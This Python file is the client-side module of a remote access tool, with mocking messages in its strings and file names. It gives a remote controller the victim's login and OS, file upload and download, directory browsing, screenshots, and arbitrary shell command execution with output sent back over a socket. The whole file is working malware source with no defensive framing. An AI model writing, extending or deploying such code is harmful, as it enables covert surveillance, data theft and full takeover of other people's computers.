"""
Here we define the operations we perform as a server, this should be the process that 
the server should perform when it receives the command response from the client
"""
import socket
import os
import datetime
import subprocess
import pyautogui
import sys
from operations.utils.datahandler import retrieve_data


class Operations:
    def __init__(self, server: socket.socket):
        self.server: socket.socket = server

    @staticmethod
    def finish_command_execution(foo):
        def wrapper(self, *args, **kwargs):
            # print("Command wrapper executed")
            foo(self, *args, **kwargs)
            self.server.sendall(str.encode('done\n\n'))
        return wrapper

    @finish_command_execution
    def hi(self):
        device_os = os.getenv("OS")
        device_login = os.getlogin()
        self.server.sendall(str.encode(f"hi i am {device_login} using {device_os} uwunyanichan"))

    def get_cwd(self):
        cwd = os.getcwd()
        self.server.sendall(str.encode(cwd))
        self.server.sendall(str.encode('done'))

    @finish_command_execution
    def upload(self, file_name):

        if not os.path.exists(file_name):
            return

        with open(file_name, "rb") as file:
            while True:
                # write the contents to server
                file_data = file.read(1024)
                if not file_data:
                    break
                self.server.sendall(file_data)

    @finish_command_execution
    def download(self, save_as: str):
        data = retrieve_data(self.server)
        with open(save_as, "wb") as file:
            file.write(data)

    @finish_command_execution
    def screenshot(self):
        # self.server.sendall(str.encode("image"))
        pic = pyautogui.screenshot()
        file_name = str("uwunyaurfucked")
        file_name = file_name + '.png'
        pic.save(file_name)
        with open(file_name, "rb") as file:
            while True:
                file_data = file.read()
                if not file_data:
                    break
                self.server.sendall(file_data)

        # self.server.sendall(str.encode("completeServing"))
        os.remove(file_name)

    @finish_command_execution
    def change_dir(self, directory: str):
        try:
            # print(f"Changing directory to: {directory}")
            os.chdir(directory)
        except Exception as e:
            self.server.sendall(str.encode(f"Error changing directory: {e}"))

    @finish_command_execution
    def list_dir(self, command: str):
        try:
            files = os.listdir(os.getcwd())
            self.server.sendall(str.encode(str(files)))
        except:
            pass

    @finish_command_execution
    def exit(self):
        self.server.sendall(str.encode("Okiwis bai bai uwunya nichan :3"))

    @finish_command_execution
    def system_commands(self, command):
        try:
            res = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            self.server.sendall(res.stdout.read())
            self.server.sendall(res.stderr.read())
        except:
            str_error = "command not recognized" + "\n"
            self.server.sendall(str.encode(str_error))